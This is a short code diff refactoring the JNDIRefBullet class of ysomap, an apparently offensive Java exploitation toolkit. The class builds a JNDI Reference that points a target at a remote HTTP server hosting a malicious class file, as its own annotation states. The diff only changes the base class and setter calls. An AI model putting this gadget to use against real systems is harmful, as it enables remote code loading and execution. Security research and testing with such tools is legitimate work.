@@ -1,8 +1,7 @@
 package ysomap.bullets.jdk.rmi;
 
-import ysomap.bullets.Bullet;
+import ysomap.bullets.AbstractBullet;
 import ysomap.common.annotation.*;
-import ysomap.core.util.ReflectionHelper;
 
 import javax.naming.Reference;
 
@@ -15,7 +14,7 @@ import javax.naming.Reference;
 @Details("适用于JNDI，向外部挂载了恶意class文件的HTTP服务发起请求")
 @Targets({Targets.JDK, Targets.HESSIAN})
 @Authors({Authors.WH1T3P1G})
-public class JNDIRefBullet implements Bullet<Reference> {
+public class JNDIRefBullet extends AbstractBullet<Reference> {
 
     @NotNull
     @Require(name = "factoryName", detail = "filename mounted by remote http server")
@@ -36,8 +35,8 @@ public class JNDIRefBullet implements Bullet<Reference> {
 
     public static JNDIRefBullet newInstance(Object... args) throws Exception {
         JNDIRefBullet bullet = new JNDIRefBullet();
-        ReflectionHelper.set(bullet, "factoryName", args[0]);
-        ReflectionHelper.set(bullet, "factoryURL", args[1]);
+        bullet.set("factoryName", args[0]);
+        bullet.set("factoryURL", args[1]);
         return bullet;
     }
 }
